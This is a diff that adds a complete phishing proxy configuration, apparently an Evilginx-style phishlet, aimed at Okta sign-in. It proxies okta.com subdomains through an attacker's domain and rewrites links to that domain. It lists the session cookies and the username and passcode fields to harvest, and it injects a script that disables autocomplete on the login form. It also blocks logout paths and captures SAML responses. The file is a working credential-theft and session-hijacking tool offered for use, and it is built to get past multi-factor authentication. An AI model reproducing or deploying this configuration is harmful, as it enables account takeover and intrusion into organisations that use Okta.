@@ -1,0 +1,73 @@
+name: okta
+author: neolinlabs
+min_ver: "2.3.0"
+
+proxy_hosts:
+  - { phish_sub: "login", orig_sub: "login", domain: "okta.com", session: true, is_landing: true }
+  - { phish_sub: "app", orig_sub: "app", domain: "okta.com", session: true }
+  - { phish_sub: "static", orig_sub: "static", domain: "okta.com", session: false }
+  - { phish_sub: "global", orig_sub: "global", domain: "okta.com", session: false }
+  - { phish_sub: "www", orig_sub: "www", domain: "okta.com", session: false }
+  - { phish_sub: "id", orig_sub: "id", domain: "okta.com", session: true }
+
+sub_filters:
+  - { domain: "okta.com", search: "https://www.okta.com", replace: "https://www.{domain}" }
+  - { domain: "okta.com", search: "https://login.okta.com", replace: "https://login.{domain}" }
+  - { domain: "okta.com", search: "https://app.okta.com", replace: "https://app.{domain}" }
+  - { domain: "okta.com", search: "href=\"/login\"", replace: "href=\"https://login.{domain}/login\"" }
+  - { domain: "okta.com", search: "https://static.okta.com", replace: "https://static.{domain}" }
+
+auth_tokens:
+  - domain: ".okta.com"
+    keys: [ "sid", "JSESSIONID", "DT", "t", "okta_session", "okta-oauth-state" ]
+
+credentials:
+  username:
+    key: "identifier"
+    search: "(identifier|username)"
+  password:
+    key: "credentials.passcode"
+    search: "(password|passcode)"
+
+force_post:
+  - path: "/api/v1/authn"
+  - path: "/login/login.htm"
+  - path: "/api/internal"
+
+login:
+  domain: "login.okta.com"
+  path: "/"
+
+js_inject:
+  - trigger_domains: ["okta.com"]
+    trigger_paths: ["/", "/login/login.htm", "/api/v1/authn"]
+    script: |
+      document.addEventListener("DOMContentLoaded", function() {
+        let u = document.querySelector('input[name="identifier"], input[name="username"]');
+        let p = document.querySelector('input[name="credentials.passcode"], input[name="password"]');
+        if (u) u.setAttribute("autocomplete", "off");
+        if (p) p.setAttribute("autocomplete", "off");
+      });
+
+deny_paths:
+  - path: "/auth/logout"
+  - path: "/login/logout"
+  - path: "/auth/services/logout"
+
+post_logout:
+  redirect_url: "https://www.okta.com/"
+
+custom_headers:
+  - domain: "okta.com"
+    headers:
+      - name: "Host"
+        value: "{hostname}"
+      - name: "Referer"
+        value: "https://{hostname}/"
+
+saml:
+  relay_state_param: "RelayState"
+  acs_param: "SAMLResponse"
+  url_paths:
+    - path: "/sso/saml"
+    - path: "/sso/acs"
